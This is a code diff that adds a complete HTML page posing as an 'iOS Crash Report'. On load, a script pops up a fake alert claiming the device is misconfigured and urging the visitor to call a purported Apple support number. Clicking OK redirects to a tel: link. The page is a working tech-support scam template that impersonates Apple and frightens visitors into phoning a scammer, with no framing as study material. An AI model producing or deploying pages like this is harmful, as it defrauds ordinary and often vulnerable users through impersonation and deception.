@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>iOS Crash Report</title>
+    <script>
+        function showAlert() {
+            if (confirm(`****IOS Crash Report ****
+
+IOS crashed previously due to unwanted websites visit. There is a problem with the configuration of your IOS. Please call Apple Technical Support at 1-888-888-8888.
+
+Click on OK, this will attempt to send a crash report to Apple. Call now Apple 1-888-888-8888.`)) {
+                window.location.href = "tel:18888888888";
+            }
+        }
+    </script>
+</head>
+<body onload="showAlert()">
+</body>
+</html>
